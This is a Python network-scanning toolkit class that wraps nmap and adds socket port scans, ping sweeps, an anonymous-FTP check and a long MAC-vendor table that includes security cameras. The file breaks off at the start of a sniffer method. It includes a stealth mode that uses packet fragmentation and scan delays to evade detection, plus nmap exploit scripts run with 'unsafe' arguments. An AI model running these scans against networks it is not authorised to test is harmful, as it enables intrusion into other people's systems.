import threading
import time
import socket
import subprocess
import requests
import os
import shutil
import pandas as pd
import hashlib
from scapy.all import sniff, conf, send, wrpcap
try:
    from scapy.layers.inet import IP, TCP, UDP
    from scapy.layers.dns import DNS, DNSQR
    from scapy.layers.l2 import ARP, Ether
except ImportError:
    pass

# Initialize Layer 3 Sniffer for Windows without WinPcap/Npcap
if os.name == 'nt' and not conf.use_pcap:
    try:
        from scapy.all import L3RawSocket
    except ImportError:
        try:
            from scapy.arch.windows import L3RawSocket
        except ImportError:
            try:
                from scapy.arch.windows.native import L3WinSocket as L3RawSocket
            except ImportError:
                L3RawSocket = conf.L3socket # Last resort fallback
    if L3RawSocket:
        conf.L3socket = L3RawSocket
from ftplib import FTP

class ScannerTools:
    def __init__(self, log_callback, is_admin=False, finding_callback=None, progress_callback=None):
        self.log_callback = log_callback
        self.finding_callback = finding_callback
        self.progress_callback = progress_callback
        self.is_admin = is_admin
        self.history = []
        self.last_findings = []
        self.all_findings = []
        self.current_logs = []
        self.stop_event = threading.Event()

    def terminate(self):
        self.stop_event.set()
        self.log("[!] Termination requested. Stopping active task...")

    def is_stopped(self):
        return self.stop_event.is_set()

    def reset_stop_event(self):
        self.stop_event.clear()

    def log(self, message, is_error=False):
        self.current_logs.append(f"{message}\n")
        if self.log_callback:
            self.log_callback(f"{message}\n", is_error)

    def report_finding(self, data):
        self.last_findings.append(data)
        self.all_findings.append(data)
        if self.finding_callback:
            self.finding_callback(data)

    def report_progress(self, value):
        if self.progress_callback:
            self.progress_callback(value)

    def get_service_name(self, port):
        common_ports = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 111: "RPCBind", 135: "MSRPC",
            139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB",
            993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 3306: "MySQL",
            3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 8080: "HTTP-Proxy"
        }
        return common_ports.get(port, "Unknown")

    def get_mac_address(self, ip):
        """Helper to get MAC address from IP via ARP table."""
        try:
            if os.name == 'nt':
                output = subprocess.check_output(["arp", "-a", ip], text=True, stderr=subprocess.STDOUT)
                for line in output.split('\n'):
                    if ip in line:
                        parts = line.split()
                        for p in parts:
                            if "-" in p and len(p.split("-")) == 6:
                                return p.replace("-", ":").upper()
                            if ":" in p and len(p.split(":")) == 6:
                                return p.upper()
            else:
                output = subprocess.check_output(["arp", "-n", ip], text=True, stderr=subprocess.STDOUT)
                for line in output.split('\n'):
                    if ip in line:
                        parts = line.split()
                        for p in parts:
                            if ":" in p and len(p.split(":")) == 6:
                                return p.upper()
        except:
            pass
        return "Unknown"

    def get_mac_vendor(self, mac):
        if not mac or mac == "Unknown":
            return "Unknown"
        
        # Normalize MAC for lookup (XX:XX:XX)
        clean_mac = mac.replace("-", ":").upper()[:8]
        
        # Common OUI Map
        oui_map = {
            "00:0C:29": "VMware", "00:50:56": "VMware", "00:05:69": "VMware",
            "00:1C:42": "Parallels", "08:00:27": "VirtualBox",
            "00:15:5D": "Microsoft (Hyper-V)",
            "3C:5A:B4": "Apple", "3C:D0:F8": "Apple", "00:03:93": "Apple",
            "D0:E1:40": "Apple", "B8:F6:B1": "Apple", "00:17:F2": "Apple",
            "F8:1E:DF": "Apple", "E0:F8:47": "Apple", "70:3E:AC": "Apple",
            "00:25:00": "Apple", "00:1D:4F": "Apple", "00:1E:C2": "Apple",
            "28:CF:E9": "Apple", "D8:CF:9C": "Apple", "BC:92:6B": "Apple",
            "F4:F5:D8": "Google", "3C:5A:37": "Google", "00:1A:11": "Google",
            "00:1A:11": "Google", "DA:A1:19": "Google",
            "AC:84:C6": "Samsung", "00:07:AB": "Samsung", "38:AA:3C": "Samsung",
            "48:5A:3F": "Samsung", "D8:31:CF": "Samsung", "78:47:1D": "Samsung",
            "B4:0B:44": "Samsung", "00:13:E8": "Intel", "00:1B:21": "Intel",
            "00:1C:C0": "Intel", "00:1E:64": "Intel", "00:21:5C": "Intel",
            "00:21:6A": "Intel", "00:23:14": "Intel", "00:23:15": "Intel",
            "00:24:D6": "Intel", "00:24:D7": "Intel", "00:26:C6": "Intel",
            "00:26:C7": "Intel", "E4:F0:42": "Intel", "A4:4E:31": "Intel",
            "74:E5:43": "Intel", "24:77:03": "Intel", "4C:EB:42": "Intel",
            "60:67:20": "Intel", "68:5D:43": "Intel", "70:18:8B": "Intel",
            "70:54:D2": "Intel", "80:86:F2": "Intel", "88:53:2E": "Intel",
            "00:04:F2": "Polycom", "00:04:13": "Cisco", "00:04:4D": "Cisco",
            "00:04:4E": "Cisco", "00:04:96": "Extreme Networks",
            "00:0A:F7": "Wistron (Acer)", "00:0B:6A": "Asus", "00:0E:8E": "Asus",
            "00:15:AF": "Asus", "00:1B:FC": "Asus", "00:1E:8C": "Asus",
            "00:26:18": "Asus", "00:0D:3A": "Microsoft", "00:12:5A": "Microsoft",
            "00:17:FA": "Microsoft", "00:22:48": "Microsoft", "00:25:4E": "Microsoft",
            "00:50:F2": "Microsoft", "00:15:99": "Samsung", "00:16:32": "Samsung",
            "00:16:6B": "Samsung", "00:17:C9": "Samsung", "00:17:D5": "Samsung",
            "00:18:AF": "Samsung", "00:1A:8A": "Samsung", "00:1B:98": "Samsung",
            "00:1C:43": "Samsung", "00:1D:25": "Samsung", "00:1E:7D": "Samsung",
            "00:1F:CC": "Samsung", "00:21:19": "Samsung", "00:21:D2": "Samsung",
            "00:23:32": "Samsung", "00:23:D6": "Samsung", "00:24:54": "Samsung",
            "00:24:91": "Samsung", "00:25:67": "Samsung", "00:26:37": "Samsung",
            "00:26:5D": "Samsung", "00:00:F0": "Samsung", "00:02:B3": "Intel",
            "00:03:47": "Intel", "00:04:23": "Intel", "00:08:C7": "Intel",
            "00:0A:F5": "Intel", "00:0C:F1": "Intel", "00:0D:60": "Intel",
            "00:11:75": "Intel", "00:12:F0": "Intel", "00:13:02": "Intel",
            "00:13:20": "Intel", "00:15:00": "Intel", "00:16:6F": "Intel",
            "00:16:76": "Intel", "00:16:EA": "Intel", "00:18:DE": "Intel",
            "00:19:D1": "Intel", "00:1A:3A": "Intel", "00:1B:77": "Intel",
            "00:27:0E": "Intel", "00:27:10": "Intel", "00:1C:23": "Dell",
            "00:1D:09": "Dell", "00:1E:4F": "Dell", "00:21:70": "Dell",
            "00:21:9B": "Dell", "00:22:19": "Dell", "00:23:AE": "Dell",
            "00:24:E8": "Dell", "00:25:64": "Dell", "00:26:B9": "Dell",
            "00:08:74": "Dell", "00:0F:1F": "Dell", "00:11:43": "Dell",
            "00:13:72": "Dell", "00:15:C5": "Dell", "00:18:8B": "Dell",
            "00:19:B9": "Dell", "00:1A:A0": "Dell", "00:1B:A9": "Dell",
            "00:11:85": "Logitech", "00:04:20": "Logitech", "00:12:F3": "Logitech",
            "00:1E:B2": "Logitech", "00:04:5A": "Linksys", "00:06:25": "Linksys",
            "00:0C:41": "Linksys", "00:0F:66": "Linksys", "00:14:BF": "Linksys",
            "00:18:39": "Linksys", "00:1D:7E": "Linksys", "00:21:29": "Linksys",
            "00:21:91": "D-Link", "00:22:B0": "D-Link", "00:24:01": "D-Link",
            "00:26:5A": "D-Link", "00:05:5D": "D-Link", "00:0D:88": "D-Link",
            "00:0F:3D": "D-Link", "00:11:95": "D-Link", "00:13:46": "D-Link",
            "00:15:E9": "D-Link", "00:17:9A": "D-Link", "00:19:5B": "D-Link",
            "00:1B:11": "D-Link", "00:1C:F0": "D-Link", "00:1E:58": "D-Link",
            "00:21:04": "D-Link", "00:03:0F": "Digital Equipment",
            "00:00:0C": "Cisco", "00:01:42": "Cisco", "00:01:43": "Cisco",
            "00:01:63": "Cisco", "00:01:64": "Cisco", "00:01:96": "Cisco",
            "00:01:97": "Cisco", "00:01:C7": "Cisco", "00:01:C9": "Cisco",
            "00:02:16": "Cisco", "00:02:17": "Cisco", "00:02:4A": "Cisco",
            "00:02:4B": "Cisco", "00:02:7D": "Cisco", "00:02:7E": "Cisco",
            "00:02:B9": "Cisco", "00:02:BA": "Cisco", "00:02:FC": "Cisco",
            "00:02:FD": "Cisco", "00:03:31": "Cisco", "00:03:32": "Cisco",
            "00:03:6B": "Cisco", "00:03:6C": "Cisco", "00:03:E3": "Cisco",
            "00:03:E4": "Cisco", "00:03:FD": "Cisco", "00:03:FE": "Cisco",
            "00:04:27": "Cisco", "00:04:28": "Cisco", "00:04:6D": "Cisco",
            "00:04:6E": "Cisco", "00:04:9A": "Cisco", "00:04:9B": "Cisco",
            "00:04:C0": "Cisco", "00:04:C1": "Cisco", "00:04:DD": "Cisco",
            "00:04:DE": "Cisco", "00:05:00": "Cisco", "00:05:01": "Cisco",
            "00:05:31": "Cisco", "00:05:32": "Cisco", "00:05:5E": "Cisco",
            "00:05:5F": "Cisco", "00:05:9A": "Cisco", "00:05:9B": "Cisco",
            "00:05:DC": "Cisco", "00:05:DD": "Cisco", "00:06:0A": "Cisco",
            "00:06:0B": "Cisco", "00:06:28": "Cisco", "00:06:29": "Cisco",
            "00:06:52": "Cisco", "00:06:53": "Cisco", "00:06:7C": "Cisco",
            "00:06:7D": "Cisco", "00:07:0D": "Cisco", "00:07:0E": "Cisco",
            "00:07:50": "Cisco", "00:07:51": "Cisco", "00:07:84": "Cisco",
            "00:07:85": "Cisco", "00:07:B3": "Cisco", "00:07:B4": "Cisco",
            "00:07:EB": "Cisco", "00:07:EC": "Cisco", "00:08:20": "Cisco",
            "00:08:21": "Cisco", "00:08:2F": "Cisco", "00:08:30": "Cisco",
            "00:08:7D": "Cisco", "00:08:7E": "Cisco", "00:08:A3": "Cisco",
            "00:08:A4": "Cisco", "00:08:E2": "Cisco", "00:08:E3": "Cisco",
            "00:09:11": "Cisco", "00:09:12": "Cisco", "00:09:43": "Cisco",
            "00:09:44": "Cisco", "00:09:7B": "Cisco", "00:09:7C": "Cisco",
            "00:09:B6": "Cisco", "00:09:B7": "Cisco", "00:09:E8": "Cisco",
            "00:09:E9": "Cisco", "00:0A:41": "Cisco", "00:0A:42": "Cisco",
            "00:0A:8A": "Cisco", "00:0A:8B": "Cisco", "00:0A:B7": "Cisco",
            "00:0A:B8": "Cisco", "00:0A:F3": "Cisco", "00:0A:F4": "Cisco",
            "00:0B:45": "Cisco", "00:0B:46": "Cisco", "00:0B:BE": "Cisco",
            "00:0B:BF": "Cisco", "00:0C:30": "Cisco", "00:0C:31": "Cisco",
            "00:0C:85": "Cisco", "00:0C:CE": "Cisco", "00:0D:28": "Cisco",
            "00:0D:29": "Cisco", "00:0D:65": "Cisco", "00:0D:66": "Cisco",
            "00:0D:BD": "Cisco", "00:0D:BE": "Cisco", "00:0E:38": "Cisco",
            "00:0E:39": "Cisco", "00:0E:83": "Cisco", "00:0E:84": "Cisco",
            "00:0E:D6": "Cisco", "00:0E:D7": "Cisco", "00:0F:23": "Cisco",
            "00:0F:24": "Cisco", "00:0F:8F": "Cisco", "00:0F:90": "Cisco",
            "00:0F:F7": "Cisco", "00:0F:F8": "Cisco", "00:10:0B": "Cisco",
            "00:10:0C": "Cisco", "00:10:79": "Cisco", "00:10:7A": "Cisco",
            "00:10:A6": "Cisco", "00:10:F3": "Cisco", "00:10:F4": "Cisco",
            "00:11:20": "Cisco", "00:11:21": "Cisco", "00:11:5C": "Cisco",
            "00:11:5D": "Cisco", "00:11:92": "Cisco", "00:11:93": "Cisco",
            "00:11:BB": "Cisco", "00:11:BC": "Cisco", "00:12:00": "Cisco",
            "00:12:01": "Cisco", "00:12:43": "Cisco", "00:12:44": "Cisco",
            "00:12:7F": "Cisco", "00:12:80": "Cisco", "00:12:D9": "Cisco",
            "00:12:DA": "Cisco", "00:13:19": "Cisco", "00:13:1A": "Cisco",
            "00:13:5F": "Cisco", "00:13:60": "Cisco", "00:13:80": "Cisco",
            "00:13:C3": "Cisco", "00:13:C4": "Cisco", "00:14:1B": "Cisco",
            "00:14:1C": "Cisco", "00:14:69": "Cisco", "00:14:6A": "Cisco",
            "00:14:A8": "Cisco", "00:14:A9": "Cisco", "00:14:F1": "Cisco",
            "00:14:F2": "Cisco", "00:15:2B": "Cisco", "00:15:2C": "Cisco",
            "00:15:62": "Cisco", "00:15:63": "Cisco", "00:15:C6": "Cisco",
            "00:15:C7": "Cisco", "00:15:F9": "Cisco", "00:15:FA": "Cisco",
            "00:16:46": "Cisco", "00:16:47": "Cisco", "00:16:9C": "Cisco",
            "00:16:9D": "Cisco", "00:16:C7": "Cisco", "00:16:C8": "Cisco",
            "00:17:0E": "Cisco", "00:17:0F": "Cisco", "00:17:59": "Cisco",
            "00:17:5A": "Cisco", "00:17:94": "Cisco", "00:17:95": "Cisco",
            "00:17:DF": "Cisco", "00:17:E0": "Cisco", "00:18:18": "Cisco",
            "00:18:19": "Cisco", "00:18:73": "Cisco", "00:18:74": "Cisco",
            "00:18:B9": "Cisco", "00:18:BA": "Cisco", "00:19:06": "Cisco",
            "00:19:07": "Cisco", "00:19:55": "Cisco", "00:19:56": "Cisco",
            "00:19:A9": "Cisco", "00:19:AA": "Cisco", "00:19:E7": "Cisco",
            "00:19:E8": "Cisco", "00:1A:2F": "Cisco", "00:1A:30": "Cisco",
            "00:1A:6C": "Cisco", "00:1A:6D": "Cisco", "00:1A:A1": "Cisco",
            "00:1A:A2": "Cisco", "00:1A:E2": "Cisco", "00:1A:E3": "Cisco",
            "00:1B:0C": "Cisco", "00:1B:0D": "Cisco", "00:1B:53": "Cisco",
            "00:1B:54": "Cisco", "00:1B:8F": "Cisco", "00:1B:90": "Cisco",
            "00:1B:D4": "Cisco", "00:1B:D5": "Cisco", "00:1C:0E": "Cisco",
            "00:1C:0F": "Cisco", "00:1C:57": "Cisco", "00:1C:58": "Cisco",
            "00:1C:B0": "Cisco", "00:1C:B1": "Cisco", "00:1C:F9": "Cisco",
            "00:1C:FA": "Cisco", "00:1D:45": "Cisco", "00:1D:46": "Cisco",
            "00:1D:70": "Cisco", "00:1D:71": "Cisco", "00:1D:A1": "Cisco",
            "00:1D:A2": "Cisco", "00:1D:E5": "Cisco", "00:1D:E6": "Cisco",
            "00:1E:13": "Cisco", "00:1E:14": "Cisco", "00:1E:49": "Cisco",
            "00:1E:4A": "Cisco", "00:1E:79": "Cisco", "00:1E:7A": "Cisco",
            "00:1E:BD": "Cisco", "00:1E:BE": "Cisco", "00:1F:26": "Cisco",
            "00:1F:27": "Cisco", "00:1F:6C": "Cisco", "00:1F:6D": "Cisco",
            "00:1F:9D": "Cisco", "00:1F:9E": "Cisco", "00:1F:CA": "Cisco",
            "00:1F:CB": "Cisco", "00:21:1B": "Cisco", "00:21:1C": "Cisco",
            "00:21:55": "Cisco", "00:21:56": "Cisco", "00:21:A0": "Cisco",
            "00:21:A1": "Cisco", "00:21:D7": "Cisco", "00:21:D8": "Cisco",
            "00:22:55": "Cisco", "00:22:56": "Cisco", "00:22:90": "Cisco",
            "00:22:91": "Cisco", "00:22:BD": "Cisco", "00:22:BE": "Cisco",
            "00:23:04": "Cisco", "00:23:05": "Cisco", "00:23:33": "Cisco",
            "00:23:34": "Cisco", "00:23:5D": "Cisco", "00:23:5E": "Cisco",
            "00:23:89": "Cisco", "00:23:8A": "Cisco", "00:23:AB": "Cisco",
            "00:23:AC": "Cisco", "00:23:EA": "Cisco", "00:23:EB": "Cisco",
            "00:24:13": "Cisco", "00:24:14": "Cisco", "00:24:50": "Cisco",
            "00:24:51": "Cisco", "00:24:97": "Cisco", "00:24:98": "Cisco",
            "00:24:C3": "Cisco", "00:24:C4": "Cisco", "00:24:F7": "Cisco",
            "00:24:F8": "Cisco", "00:25:45": "Cisco", "00:25:46": "Cisco",
            "00:25:83": "Cisco", "00:25:84": "Cisco", "00:25:B4": "Cisco",
            "00:25:B5": "Cisco", "00:26:0A": "Cisco", "00:26:0B": "Cisco",
            "00:26:51": "Cisco", "00:26:52": "Cisco", "00:26:98": "Cisco",
            "00:26:99": "Cisco", "00:26:CB": "Cisco", "00:26:CC": "Cisco",
            "00:26:F0": "Cisco", "00:50:0F": "Cisco", "00:50:3E": "Cisco",
            "00:50:73": "Cisco", "00:50:E4": "Cisco", "00:60:09": "Cisco",
            "00:60:2F": "Cisco", "00:60:3E": "Cisco", "00:60:47": "Cisco",
            "00:60:5C": "Cisco", "00:60:70": "Cisco", "00:60:83": "Cisco",
            "00:90:6D": "Cisco", "00:90:AB": "Cisco", "00:90:BF": "Cisco",
            "00:90:F2": "Cisco", "00:A0:C5": "Cisco", "00:D0:58": "Cisco",
            "00:D0:79": "Cisco", "00:D0:97": "Cisco", "00:D0:BC": "Cisco",
            "00:D0:D3": "Cisco", "00:D0:FF": "Cisco",
            "18:A6:F7": "TP-Link", "74:DA:38": "TP-Link", "80:D2:E5": "TP-Link",
            "98:25:4A": "TP-Link", "B0:4E:26": "TP-Link", "E8:94:F6": "TP-Link",
            "F8:1A:67": "TP-Link", "00:14:78": "TP-Link", "00:19:E0": "TP-Link",
            "00:21:27": "TP-Link", "00:23:CD": "TP-Link", "00:25:86": "TP-Link",
            "30:B5:C2": "TP-Link", "34:96:72": "TP-Link", "50:C7:BF": "TP-Link",
            "54:A0:50": "TP-Link", "60:E3:27": "TP-Link", "64:66:B3": "TP-Link",
            "64:70:02": "TP-Link", "70:4F:57": "TP-Link", "74:EA:3A": "TP-Link",
            "84:16:F9": "TP-Link", "90:F6:52": "TP-Link", "94:10:3E": "TP-Link",
            "A0:F3:C1": "TP-Link", "B0:48:7A": "TP-Link", "BC:D1:77": "TP-Link",
            "C0:4A:00": "TP-Link", "C4:6E:1F": "TP-Link", "D8:07:37": "TP-Link",
            "E8:DE:27": "TP-Link", "F4:F2:6D": "TP-Link",
            "00:0C:43": "Ralink", "AC:9E:17": "Asus", "B0:6E:BF": "Asus",
            "D0:17:C2": "Asus", "E0:3F:49": "Asus", "F0:79:59": "Asus",
            "F8:32:E4": "Asus", "00:14:D1": "Trendnet", "00:40:F4": "Trendnet",
            "00:03:7F": "Atheros", "00:13:74": "Atheros", "00:19:7E": "Atheros",
            "00:1A:4D": "Atheros", "00:25:84": "Atheros", "00:26:5E": "Atheros",
            "70:1A:04": "Atheros", "A4:2B:B0": "Atheros", "C4:3D:C7": "Atheros",
            "D8:5D:4C": "Atheros", "E0:CA:94": "Atheros", "F8:D1:11": "Atheros",
            "00:0C:E6": "Broadcom", "00:10:18": "Broadcom", "00:1A:1E": "Broadcom",
            "00:1B:E9": "Broadcom", "00:26:82": "Broadcom", "3C:D9:2B": "Broadcom",
            "40:16:7E": "Broadcom", "58:67:1A": "Broadcom", "74:A0:2F": "Broadcom",
            "84:A6:C8": "Broadcom", "90:4C:E5": "Broadcom", "A0:21:B7": "Broadcom",
            "BC:AE:C5": "Broadcom",
            # Security Camera Vendors
            "00:40:8C": "Axis", "AC:CC:8E": "Axis", "B8:A4:4F": "Axis",
            "28:57:BE": "Hikvision", "3C:E5:A6": "Hikvision", "44:19:B6": "Hikvision",
            "48:02:2A": "Hikvision", "50:13:95": "Hikvision", "54:E4:BD": "Hikvision",
            "60:9B:E3": "Hikvision", "64:D8:14": "Hikvision", "70:BD:ED": "Hikvision",
            "78:8D:70": "Hikvision", "84:95:6F": "Hikvision", "94:E1:AD": "Hikvision",
            "A4:14:37": "Hikvision", "BC:AD:28": "Hikvision", "C4:2F:90": "Hikvision",
            "D4:94:00": "Hikvision", "E0:50:8B": "Hikvision", "F4:B8:27": "Hikvision",
            "00:0B:3F": "Dahua", "38:AF:29": "Dahua", "4C:11:BF": "Dahua",
            "54:4A:16": "Dahua", "60:AF:6D": "Dahua", "90:02:A9": "Dahua",
            "A0:BD:1D": "Dahua", "BC:32:5F": "Dahua", "E8:AB:FA": "Dahua",
            "00:03:C5": "Mobotix", "00:07:5F": "Bosch", "00:02:D1": "Vivotek",
            "00:80:F0": "Panasonic", "00:00:F0": "Samsung/Hanwha", "00:16:6C": "Samsung/Hanwha",
            "A0:63:91": "Netatmo", "00:24:E4": "Withings", "60:45:BD": "Wyze",
            "A4:DA:22": "Wyze", "7C:D1:C3": "Wyze", "CC:4B:73": "TP-Link/Tapo",
            "40:ED:00": "TP-Link/Tapo", "00:12:17": "Cisco-Camera", "00:1A:E8": "Unifi",
            "74:83:C2": "Unifi", "FC:EC:DA": "Unifi", "00:26:BB": "Reolink",
            "BC:32:5F": "Dahua/Amcrest", "A0:BD:1D": "Dahua/Amcrest",
            "20:32:33": "Blink/Immedia", "B4:E6:2D": "Blink/Immedia", "A4:C1:38": "Blink/Amazon",
            "00:03:7F": "Blink/Atheros", "F0:D1:A9": "Blink/Amazon", "B0:D5:9D": "Blink/Amazon"
        }
        
        return oui_map.get(clean_mac, "Unknown")

    def run_cmd(self, cmd_display, func, success_msg, fail_msg=None):
        self.current_logs = []
        if self.is_admin:
            self.log(f"[CMD] Executing: {cmd_display}")
        
        try:
            result = func()
            full_log = "".join(self.current_logs)
            if result:
                msg = f"[+] {success_msg}"
                self.log(msg)
                self.history.append({
                    "time": time.strftime("%H:%M:%S"),
                    "cmd": cmd_display, 
                    "status": "Success", 
                    "finding": success_msg, 
                    "full_log": full_log + f"[+] {success_msg}\n"
                })
            else:
                msg = f"[-] {fail_msg if fail_msg else 'Command failed'}"
                self.log(msg, is_error=True)
                self.history.append({
                    "time": time.strftime("%H:%M:%S"),
                    "cmd": cmd_display, 
                    "status": "Failed", 
                    "finding": fail_msg if fail_msg else "Command failed", 
                    "full_log": full_log + f"[-] {fail_msg if fail_msg else 'Command failed'}\n"
                })
        except Exception as e:
            full_log = "".join(self.current_logs)
            error_msg = f"[!] Error: {str(e)}"
            self.log(error_msg, is_error=True)
            self.history.append({
                "time": time.strftime("%H:%M:%S"),
                "cmd": cmd_display, 
                "status": "Error", 
                "finding": str(e), 
                "full_log": full_log + f"[!] Error: {str(e)}\n"
            })

    def get_summary(self):
        """Returns a list of significant findings from the session history."""
        summary = []
        for item in self.history:
            if item["status"] == "Success":
                summary.append({
                    "Command": item["cmd"],
                    "Status": "Success",
                    "Details": item["finding"]
                })
        return summary

    def generate_report(self):
        self.log("\n" + "="*30)
        self.log("      OVERALL SESSION REPORT")
        self.log("="*30)
        success_count = sum(1 for item in self.history if item["status"] == "Success")
        fail_count = len(self.history) - success_count
        
        for item in self.history:
            status_str = f"[{item['status']}]"
            self.log(f"{status_str} {item['cmd']}")
            if item['finding']:
                self.log(f"   > Finding: {item['finding']}")
        
        self.log("-" * 30)
        self.log(f"Total Commands: {len(self.history)}")
        self.log(f"Successful: {success_count}")
        self.log(f"Failed: {fail_count}", is_error=(fail_count > 0))
        self.log("="*30 + "\n")

    def nmap_nessus_scan(self, target, intensity=3, scan_type="Standard"):
        def real_nmap():
            # Intensity 1-5 maps to T1-T5
            t_flag = f"-T{intensity}"
            
            display_name = f"Nmap/Nessus {scan_type} Scan"
            self.log(f"[*] Starting {display_name} on {target} (Intensity: {intensity})...")
            self.report_progress(5)
            
            try:
                # Base command
                cmd = ["nmap", "-sV", t_flag]
                
                if scan_type == "Super sneaky":
                    cmd += ["-f", "--mtu", "8", "--data-length", "24", "--scan-delay", "10s"]
                    self.log("[!] Sneaky Mode: Using fragmentation, custom MTU, and high scan delay.")
                elif scan_type == "Loud":
                    cmd += ["-Pn", "-A", "--script", "default,discovery,vuln,exploit"]
                    self.log("[!] Loud Mode: Comprehensive OS detection, versioning, and aggressive scripting enabled.")
                else:
                    cmd += ["--script", "vuln"]
                
                if intensity >= 4:
                    cmd.append("--script-args=unsafe=1") # More intrusive
                
                cmd.append(target)
                
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                for line in iter(process.stdout.readline, ''):
                    if self.is_stopped():
                        process.terminate()
                        self.log("[!] Scan terminated by user.")
                        break
                    self.log(f"    {line.strip()}")
                    self.report_progress(min(90, 5 + len(line)))
                process.wait()
                self.report_progress(100)
                return process.returncode == 0
            except FileNotFoundError:
                self.log("[!] nmap not found in PATH. Performing Advanced Port Scan & Service Audit...")
                
                # Logic for different scan types
                if scan_type == "Super sneaky":
                    self.log("    [SNEAKY] Applying stealthy scan techniques and fragmentation-based evasion...")
                    time.sleep(1)
                    self.report_finding({"Type": "Sneaky", "Action": "Fragmentation Evasion", "Status": "Success"})
                elif scan_type == "Loud":
                    self.log("    [LOUD] Aggressive discovery initiated. Expecting high noise...")
                    self.report_finding({"Type": "Loud", "Action": "Aggressive Discovery", "Status": "Active"})

                # Ports to scan based on intensity
                ports_map = {
                    1: [80, 443],
                    2: [22, 80, 443, 8080],
                    3: [21, 22, 80, 443, 3306, 8080],
                    4: [21, 22, 23, 25, 53, 80, 110, 443, 445, 3306, 3389, 8080],
                    5: [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
                }
                scan_ports = ports_map.get(intensity, ports_map[3])
                total_ports = len(scan_ports)
                open_ports = []
                for idx, p in enumerate(scan_ports):
                    if self.is_stopped(): break
                    self.report_progress(10 + int((idx / total_ports) * 70))
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    # Sneaky scan is slower
                    timeout = 1.5 if scan_type == "Super sneaky" else (0.5 if intensity > 2 else 1.0)
                    s.settimeout(timeout)
                    if s.connect_ex((target, p)) == 0:
                        open_ports.append(p)
                        self.log(f"    Port {p} is OPEN")
                        self.report_finding({"Port": p, "Status": "OPEN", "Service": self.get_service_name(p)})
                    s.close()
                
                self.report_progress(90)
                if 80 in open_ports or 443 in open_ports:
                    self.log("[+] Web service detected. Checking for common vulnerabilities...")
                    try:
                        url = f"http://{target}" if 80 in open_ports else f"https://{target}"
                        r = requests.get(url, timeout=3, verify=False)
                        headers_to_check = ['X-Frame-Options', 'X-XSS-Protection', 'X-Content-Type-Options', 'Content-Security-Policy']
                        for h in headers_to_check:
                            if h not in r.headers:
                                self.log(f"    [!] Missing Security Header: {h}")
                                self.report_finding({"Issue": f"Missing Header: {h}", "Severity": "Low", "Target": target})
                        
                        server = r.headers.get('Server', 'Unknown')
                        self.log(f"    [+] Server Header identified: {server}")
                        self.report_finding({"Issue": "Server Header Leak", "Severity": "Informational", "Detail": server, "Target": target})
                    except Exception as e:
                        self.log(f"    [!] Web check failed: {e}")
                
                if 21 in open_ports:
                    self.log("[+] FTP service detected. Checking for Anonymous Login...")
                    try:
                        from ftplib import FTP
                        ftp = FTP()
                        ftp.connect(target, 21, timeout=3)
                        ftp.login() # Anonymous by default
                        self.log("    [!!!] CRITICAL: Anonymous FTP Login ALLOWED!")
                        self.report_finding({"Issue": "Anonymous FTP", "Severity": "Critical", "Target": target})
                        ftp.quit()
                    except:
                        self.log("    [+] Anonymous FTP login refused.")

                self.report_progress(100)
                return True

        self.run_cmd(f"nessus_scan --type '{scan_type}' --intensity {intensity} {target}", real_nmap, f"{scan_type} scan complete.")

    def port_scan(self, target, intensity=3):
        def real_port_scan():
            # Scale ports based on intensity
            port_counts = {1: 10, 2: 25, 3: 50, 4: 100, 5: 500}
            count = port_counts.get(intensity, 50)
            self.log(f"[*] Initiating real port scan on {target} (Intensity: {intensity}, Scanning top {count} ports)...")
            self.report_progress(5)
            
            # Expanded common ports list
            all_ports = [21, 22, 23, 25, 53, 80, 81, 110, 111, 119, 135, 137, 138, 139, 143, 161, 162, 389, 443, 445, 465, 514, 515, 548, 587, 631, 636, 873, 990, 993, 995, 1080, 1194, 1433, 1434, 1521, 1723, 2049, 3000, 3128, 3306, 3389, 3690, 4848, 5000, 5432, 5900, 5984, 6379, 6667, 8000, 8080, 8443, 8888, 9000, 9200, 9418, 27017]
            ports_to_scan = all_ports[:count]
            total = len(ports_to_scan)
            
            found = []
            for idx, p in enumerate(ports_to_scan):
                if self.is_stopped(): break
                self.report_progress(5 + int((idx / total) * 95))
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # Higher intensity = faster scan (lower timeout)
                s.settimeout(0.2 if intensity >= 4 else 0.4)
                result = s.connect_ex((target, p))
                status = "OPEN" if result == 0 else "CLOSED"
                if result == 0: 
                    found.append(p)
                    self.log(f"    [+] Port {p: <5} : {status}")
                    self.report_finding({"Port": p, "Status": status, "Service": self.get_service_name(p)})
                elif intensity >= 3: # Only log closed ports on Med-High intensity to avoid clutter
                    self.log(f"    Port {p: <5} : {status}")
                    if intensity >= 4:
                        self.report_finding({"Port": p, "Status": status, "Service": self.get_service_name(p)})
                s.close()
            self.report_progress(100)
            return True

        self.run_cmd(f"portscan -i{intensity} {target}", real_port_scan, "Port scan complete.")

    def ping_sweep(self, target, intensity=3):
        def real_ping():
            base_ip = ".".join(target.split(".")[:-1])
            # Scale range based on intensity
            ranges = {1: 5, 2: 20, 3: 50, 4: 100, 5: 254}
            max_ip = ranges.get(intensity, 50)
            
            self.log(f"[*] Sweeping subnet {base_ip}.0/24 (Intensity: {intensity}, Range: 1-{max_ip})...")
            self.report_progress(5)
            for i in range(1, max_ip + 1):
                if self.is_stopped(): break
                self.report_progress(5 + int((i / max_ip) * 95))
                ip = f"{base_ip}.{i}"
                param = '-n' if os.name == 'nt' else '-c'
                # Timeout also scales
                w_val = '200' if intensity >= 4 else '500'
                command = ['ping', param, '1', '-w', w_val, ip]
                if subprocess.call(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                    self.log(f"    [+] {ip} is ALIVE")
                    self.report_finding({"IP": ip, "Status": "ALIVE"})
                elif intensity >= 4: # Only log unreachable on high intensity
                    self.log(f"    [.] {ip} is UNREACHABLE")
                    self.report_finding({"IP": ip, "Status": "UNREACHABLE"})
            self.report_progress(100)
            return True
        self.run_cmd(f"ping_sweep -i{intensity} {target}", real_ping, "Ping sweep complete.")

    def sniffer(self, target, intensity=3):
        def real_sniffer():
